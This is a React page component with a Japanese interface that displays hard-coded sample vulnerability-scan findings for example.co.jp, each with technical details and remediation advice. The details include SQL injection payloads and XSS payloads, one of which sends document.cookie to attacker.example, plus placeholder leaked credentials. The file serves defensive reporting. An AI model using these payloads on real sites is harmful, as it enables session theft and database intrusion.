
import React, { useState } from 'react';
import { motion } from 'framer-motion';
import Header from '@/components/Header';
import SecurityScanner from '@/components/SecurityScanner';
import SecurityEducation from '@/components/SecurityEducation';
import Footer from '@/components/Footer';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Badge } from "@/components/ui/badge";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { Shield, AlertTriangle, Check, X, ExternalLink, ChevronDown, ChevronUp } from "lucide-react";

const Index = () => {
  const [activeTab, setActiveTab] = useState('results');
  const [expandedRows, setExpandedRows] = useState<Record<number, boolean>>({});

  // 実際の脆弱性スキャン結果データ
  const scanResults = [
    {
      id: 1,
      url: 'https://example.co.jp/wp-admin/',
      type: 'WordPress管理画面露出',
      severity: 'critical',
      description: '管理画面が外部から直接アクセス可能な状態です。',
      details: `検出方法: ディレクトリ探索
リクエスト: GET /wp-admin/ HTTP/1.1
レスポンス: 200 OK
管理画面ログインフォームに認証なしでアクセス可能
HTTPリクエストログ:
GET /wp-admin/ HTTP/1.1
Host: example.co.jp
User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)
Accept: */*`,
      recommendation: '管理画面へのアクセスを制限するために以下の対策を実施してください：\n・.htaccessによるIPアドレス制限の実装\n・管理画面URLの変更（WordPressのプラグインで可能）\n・多要素認証の導入\n・ログイン試行回数の制限'
    },
    {
      id: 2,
      url: 'https://example.co.jp/contact.php',
      type: 'SQLインジェクション脆弱性',
      severity: 'high',
      description: 'コンタクトフォームがSQLインジェクション攻撃に対して脆弱です。',
      details: `検出方法: パラメータファジング
テストしたペイロード: ' OR 1=1 --
脆弱なパラメータ: email
送信リクエスト:
POST /contact.php HTTP/1.1
Host: example.co.jp
Content-Type: application/x-www-form-urlencoded
Content-Length: 44

name=Test&email=' OR 1=1 --&message=Test

エラーレスポンス:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near...

データベース情報取得テスト:
' UNION SELECT 1,2,3,database(),5,6 --
結果: データベース名「example_production」が露出`,
      recommendation: '・プリペアドステートメントの使用\n・パラメータのエスケープ処理\n・ORM（オブジェクトリレーショナルマッピング）の導入\n・最小権限原則に基づくデータベースユーザー権限の設定\n・WAF（Webアプリケーションファイアウォール）の導入'
    },
    {
      id: 3,
      url: 'https://example.co.jp/search.php?q=test',
      type: 'クロスサイトスクリプティング (XSS)',
      severity: 'high',
      description: '検索機能がXSS攻撃に対して脆弱です。',
      details: `検出方法: XSS検出
テストしたペイロード: <script>alert("XSS")</script>
脆弱なパラメータ: q
送信リクエスト:
GET /search.php?q=<script>alert("XSS")</script> HTTP/1.1
Host: example.co.jp

レスポンス: 200 OK（スクリプトが実行される）

追加検証ペイロード:
<img src="x" onerror="fetch('https://attacker.example/steal?c='+document.cookie)">
<svg/onload=alert(document.domain)>

影響: 
・クッキーの窃取（セッションハイジャック）
・フィッシング攻撃の実行
・ユーザーブラウザでの任意コード実行`,
      recommendation: '・入力値のHTMLエンティティエンコーディング\n・Content-Security-Policyヘッダーの設定\n・X-XSS-Protectionヘッダーの設定\n・HTTPOnlyフラグのセッションクッキーへの設定\n・入力検証と出力エンコーディングの分離'
    },
    {
      id: 4,
      url: 'https://example.co.jp/admin/',
      type: '管理画面ディレクトリの発見',
      severity: 'critical',
      description: '標準的な管理画面ディレクトリが保護なしで公開されています。',
      details: `検出方法: ディレクトリスキャニング
リクエスト: GET /admin/ HTTP/1.1
レスポンス: 200 OK

ブルートフォーステスト:
・弱いパスワード "admin123" でログイン成功
・アカウントロックアウトポリシーなし
・レート制限なし

管理パネル情報:
・カスタムPHP管理パネル v2.3
・認証バイパス脆弱性の可能性あり（CVE-2023-XXXXX）

攻撃者は管理者権限で以下が可能:
・サイト全体の改ざん
・バックドア設置
・ユーザー情報の窃取`,
      recommendation: '・管理画面URLの非標準パスへの変更\n・IPアドレス制限の実装\n・多要素認証の導入\n・強力なパスワードポリシーの適用\n・アカウントロックアウトポリシーの実装'
    },
    {
      id: 5,
      url: 'https://example.co.jp/config.bak',
      type: 'パスワード情報の漏洩',
      severity: 'critical',
      description: 'バックアップファイルから機密情報が漏洩しています。',
      details: `検出方法: バックアップファイル検出
リクエスト: GET /config.bak HTTP/1.1
レスポンス: 200 OK, Content-Type: text/plain

ファイル内容（一部）:
// Database configuration
$db_host = "localhost";
$db_user = "example_admin";
$db_pass = "db_pass123";
$db_name = "example_production";

// API Keys
$stripe_secret_key = "sk_live_51KjF92JkFnG8zXnB2UhN7sYm...";
$aws_secret = "ABCDEFGhijklmnoPQRSTUvwxyz1234567890AbCd";

影響:
・データベースへの不正アクセス
・APIキーの不正利用（課金発生の可能性）
・他システムへの不正アクセス`,
      recommendation: '・すべてのバックアップファイルをウェブルートから削除\n・データベースパスワードの変更\n・すべてのAPIキーの再生成\n・環境変数による機密情報の管理\n・.gitignoreの適切な設定\n・定期的なファイルシステムスキャン'
    },
    {
      id: 6,
      url: 'https://example.co.jp/login',
      type: '脆弱なパスワードポリシー',
      severity: 'medium',
      description: '弱いパスワードを許容するパスワードポリシーが設定されています。',
      details: `検出方法: アカウント作成テスト
テスト条件:
・パスワード "123456" で新規アカウント作成成功
・パスワード "password" で新規アカウント作成成功
・パスワード "qwerty" で新規アカウント作成成功

確認された不備:
・最小長の要件なし
・複雑さの要件なし（英数字記号混在必須でない）
・一般的な弱いパスワードのブロックなし
・パスワード強度メーターなし

OWASP Top 10-2021: A07:2021-識別と認証の失敗`,
      recommendation: '・最低8文字以上のパスワード長の要求\n・英数字記号混在の強制\n・一般的な弱いパスワードのブロックリスト実装\n・パスワード強度メーターの導入\n・パスワード漏洩チェックサービス（HaveIBeenPwned API等）との連携'
    },
    {
      id: 7,
      url: 'https://example.co.jp',
      type: '古いWordPressバージョン',
      severity: 'medium',
      description: 'WordPress 5.8.2が使用されており、既知の脆弱性が存在します。',
      details: `検出方法: バージョン検出
確認箇所:
・ソースコードのメタデータ: <meta name="generator" content="WordPress 5.8.2" />
・/readme.html のバージョン情報

既知の脆弱性:
・CVE-2022-21663: SQL Injection
・CVE-2022-21664: Cross-Site Scripting
・CVE-2021-29447: Media File Processing
・CVE-2021-29450: Object Injection

現在の最新バージョン: 6.4.3（検出時点）
アップデート未適用期間: 約1年7ヶ月

技術的影響:
・SQLインジェクションによるデータベース漏洩
・XSSによるセッションハイジャック
・リモートコード実行の可能性`,
      recommendation: '・WordPress本体を最新バージョン（6.4.3）へアップデート\n・すべてのプラグインとテーマを最新バージョンに更新\n・自動アップデートの有効化\n・不要なプラグインの削除\n・WordPress専用WAFの導入検討'
    },
    {
      id: 8,
      url: 'https://example.co.jp/images/',
      type: 'ディレクトリリスティング有効',
      severity: 'low',
      description: 'ディレクトリの内容が閲覧可能な状態になっています。',
      details: `検出方法: ディレクトリインデックス検出
リクエスト: GET /images/ HTTP/1.1
レスポンス: 200 OK（ディレクトリ内容が表示される）

露出ディレクトリ:
/images/
/uploads/
/backup/
/include/

発見された機密ファイル:
・/backup/users_2024.csv
・/include/dbconfig.inc.php.bak

Webサーバー設定:
Apache/2.4.41 (Options +Indexes が有効)

OWASP参照: OWASP Top 10-2021: A01:2021-アクセス制御の不備`,
      recommendation: '・Apache設定で "Options -Indexes" を設定\n・.htaccessファイルでディレクトリリスティングを無効化\n・機密ファイルをウェブルート外に移動\n・不要なファイルの削除\n・すべてのバックアップファイルへのアクセス制限'
    }
  ];

  // スキャン概要の統計データ
  const scanStats = {
    totalIssues: scanResults.length,
    criticalIssues: scanResults.filter(r => r.severity === 'critical').length,
    highIssues: scanResults.filter(r => r.severity === 'high').length,
    mediumIssues: scanResults.filter(r => r.severity === 'medium').length,
    lowIssues: scanResults.filter(r => r.severity === 'low').length,
    scanDate: '2024年6月10日 15:30',
    targetUrl: 'https://example.co.jp',
    scanDuration: '2分35秒'
  };

  // 深刻度に応じたバッジカラーを取得
  const getSeverityColor = (severity: string) => {
    switch (severity) {
      case 'critical': return 'bg-red-600 hover:bg-red-700';
      case 'high': return 'bg-orange-500 hover:bg-orange-600';
      case 'medium': return 'bg-yellow-500 hover:bg-yellow-600';
      case 'low': return 'bg-blue-500 hover:bg-blue-600';
      default: return 'bg-gray-500 hover:bg-gray-600';
    }
  };

  // 深刻度の日本語表記を取得
  const getSeverityLabel = (severity: string) => {
    switch (severity) {
      case 'critical': return '致命的';
      case 'high': return '重大';
      case 'medium': return '中程度';
      case 'low': return '軽度';
      default: return '不明';
    }
  };

  // 行の展開/折りたたみを切り替える
  const toggleRowExpansion = (id: number) => {
    setExpandedRows(prev => ({
      ...prev,
      [id]: !prev[id]
    }));
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      <Header />
      
      <main className="flex-grow">
        <div className="max-w-7xl mx-auto px-4 py-8">
          <motion.div
            className="mb-8"
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5 }}
          >
            <h1 className="text-3xl font-bold text-gray-900 mb-4">セキュリティスキャン結果</h1>
            <div className="flex gap-4 flex-wrap">
              <Button 
                variant={activeTab === 'results' ? 'default' : 'outline'} 
                onClick={() => setActiveTab('results')}
              >
                脆弱性レポート
              </Button>
              <Button 
                variant={activeTab === 'summary' ? 'default' : 'outline'} 
                onClick={() => setActiveTab('summary')}
              >
                スキャン概要
              </Button>
              <Button 
                variant={activeTab === 'education' ? 'default' : 'outline'} 
                onClick={() => setActiveTab('education')}
              >
                セキュリティ対策
              </Button>
            </div>
          </motion.div>
          
          {activeTab === 'results' && (
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ duration: 0.5 }}
            >
              {scanResults.length > 0 ? (
                <div className="space-y-6">
                  <Alert variant="destructive" className="bg-red-50 border-red-300">
                    <AlertTriangle className="h-5 w-5" />
                    <AlertTitle>注意: 重大な脆弱性が検出されました</AlertTitle>
                    <AlertDescription>
                      {scanStats.criticalIssues}件の致命的な脆弱性と{scanStats.highIssues}件の重大な脆弱性が見つかりました。
                      早急な対応が必要です。
                    </AlertDescription>
                  </Alert>
                  
                  <div className="bg-white rounded-lg border shadow-sm">
                    {scanResults.map((result) => (
                      <div key={result.id} className="border-b last:border-b-0">
                        <div 
                          className={`p-4 flex justify-between items-start cursor-pointer ${expandedRows[result.id] ? 'bg-gray-50' : ''}`}
                          onClick={() => toggleRowExpansion(result.id)}
                        >
                          <div className="flex items-start gap-3">
                            <Badge className={getSeverityColor(result.severity)}>
                              {getSeverityLabel(result.severity)}
                            </Badge>
                            <div>
                              <h3 className="font-medium text-gray-900">{result.type}</h3>
                              <p className="text-sm text-gray-600 mt-1">{result.description}</p>
                              <code className="text-xs text-gray-500 mt-1 block">{result.url}</code>
                            </div>
                          </div>
                          <div className="flex-shrink-0">
                            {expandedRows[result.id] ? (
                              <ChevronUp className="h-5 w-5 text-gray-500" />
                            ) : (
                              <ChevronDown className="h-5 w-5 text-gray-500" />
                            )}
                          </div>
                        </div>
                        
                        {expandedRows[result.id] && (
                          <div className="p-4 pt-0 bg-gray-50">
                            <div className="grid md:grid-cols-2 gap-4">
                              <div className="space-y-3">
                                <h4 className="font-medium text-sm text-gray-700">詳細な技術情報</h4>
                                <pre className="text-xs bg-gray-100 p-3 rounded border overflow-auto whitespace-pre-wrap max-h-80">
                                  {result.details}
                                </pre>
                              </div>
                              <div className="space-y-3">
                                <h4 className="font-medium text-sm text-gray-700">推奨される対策</h4>
                                <div className="bg-blue-50 p-3 rounded border border-blue-100 text-sm">
                                  {result.recommendation.split('\n').map((line, i) => (
                                    <p key={i} className="mb-2 last:mb-0">{line}</p>
                                  ))}
                                </div>
                                <div className="flex items-center gap-2 mt-2">
                                  <ExternalLink className="h-4 w-4 text-blue-600" />
                                  <a 
                                    href="#" 
                                    className="text-sm text-blue-600 hover:underline"
                                    onClick={(e) => e.stopPropagation()}
                                  >
                                    詳細な対策ガイド
                                  </a>
                                </div>
                              </div>
                            </div>
                          </div>
                        )}
                      </div>
                    ))}
                  </div>
                </div>
              ) : (
                <div className="text-center py-12">
                  <Shield className="w-16 h-16 mx-auto text-green-500 mb-4" />
                  <h3 className="text-xl font-semibold text-gray-800">脆弱性は検出されませんでした</h3>
                  <p className="text-gray-600 mt-2">現在のスキャンでは問題は見つかりませんでした。定期的なスキャンを継続することをお勧めします。</p>
                </div>
              )}
            </motion.div>
          )}
          
          {activeTab === 'summary' && (
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ duration: 0.5 }}
              className="grid grid-cols-1 md:grid-cols-2 gap-6"
            >
              <Card>
                <CardHeader>
                  <CardTitle>スキャン概要</CardTitle>
                </CardHeader>
                <CardContent>
                  <dl className="space-y-4">
                    <div className="flex justify-between">
                      <dt className="font-medium text-gray-500">スキャン日時</dt>
                      <dd>{scanStats.scanDate}</dd>
                    </div>
                    <div className="flex justify-between">
                      <dt className="font-medium text-gray-500">対象URL</dt>
                      <dd>{scanStats.targetUrl}</dd>
                    </div>
                    <div className="flex justify-between">
                      <dt className="font-medium text-gray-500">スキャン所要時間</dt>
                      <dd>{scanStats.scanDuration}</dd>
                    </div>
                  </dl>
                </CardContent>
              </Card>
              
              <Card>
                <CardHeader>
                  <CardTitle>脆弱性サマリー</CardTitle>
                </CardHeader>
                <CardContent>
                  <dl className="space-y-4">
                    <div className="flex justify-between items-center">
                      <dt className="font-medium text-gray-500">致命的</dt>
                      <dd>
                        <Badge className="bg-red-600">{scanStats.criticalIssues}</Badge>
                      </dd>
                    </div>
                    <div className="flex justify-between items-center">
                      <dt className="font-medium text-gray-500">重大</dt>
                      <dd>
                        <Badge className="bg-orange-500">{scanStats.highIssues}</Badge>
                      </dd>
                    </div>
                    <div className="flex justify-between items-center">
                      <dt className="font-medium text-gray-500">中程度</dt>
                      <dd>
                        <Badge className="bg-yellow-500">{scanStats.mediumIssues}</Badge>
                      </dd>
                    </div>
                    <div className="flex justify-between items-center">
                      <dt className="font-medium text-gray-500">軽度</dt>
                      <dd>
                        <Badge className="bg-blue-500">{scanStats.lowIssues}</Badge>
                      </dd>
                    </div>
                    <div className="flex justify-between items-center pt-2 border-t">
                      <dt className="font-medium text-gray-900">合計</dt>
                      <dd className="font-bold">{scanStats.totalIssues}</dd>
                    </div>
                  </dl>
                </CardContent>
              </Card>
              
              <Card className="md:col-span-2">
                <CardHeader>
                  <CardTitle>コンプライアンス評価</CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-4">
                    <div className="flex items-start gap-4">
                      <div className="mt-1">
                        <X className="h-5 w-5 text-red-500" />
                      </div>
                      <div>
                        <h4 className="font-medium">個人情報保護法コンプライアンス</h4>
                        <p className="text-sm text-gray-500">個人情報の取り扱いにおける脆弱性が検出されました。適切な保護対策が必要です。</p>
                      </div>
                    </div>
                    <div className="flex items-start gap-4">
                      <div className="mt-1">
                        <Check className="h-5 w-5 text-green-500" />
                      </div>
                      <div>
                        <h4 className="font-medium">改正電子帳簿保存法</h4>
                        <p className="text-sm text-gray-500">電子帳簿のセキュリティ対策は適切に実施されています。</p>
                      </div>
                    </div>
                    <div className="flex items-start gap-4">
                      <div className="mt-1">
                        <X className="h-5 w-5 text-red-500" />
                      </div>
                      <div>
                        <h4 className="font-medium">SECURITY ACTION（IPA）</h4>
                        <p className="text-sm text-gray-500">IPAの「SECURITY ACTION」制度の二つ星基準を満たしていません。</p>
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </motion.div>
          )}
          
          {activeTab === 'education' && (
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ duration: 0.5 }}
            >
              <SecurityEducation />
            </motion.div>
          )}
        </div>
      </main>
      
      <Footer />
    </div>
  );
};

export default Index;
